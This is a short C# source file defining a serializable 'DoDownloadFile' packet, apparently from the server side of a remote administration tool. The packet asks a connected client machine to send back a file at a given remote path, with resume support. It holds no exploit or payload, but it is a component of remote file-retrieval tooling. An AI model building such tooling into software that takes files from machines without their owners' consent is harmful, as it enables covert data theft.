using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoDownloadFile : IPacket
    {
        public string RemotePath { get; set; }

        public int ID { get; set; }

        public int StartBlock { get; set; }

        public bool Resumed { get; set; }

        public DoDownloadFile()
        {
        }

        public DoDownloadFile(string remotepath, int id, int startBlock, bool resumed = false)
        {
            this.RemotePath = remotepath;
            this.ID = id;
            this.StartBlock = startBlock;
            this.Resumed = resumed;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}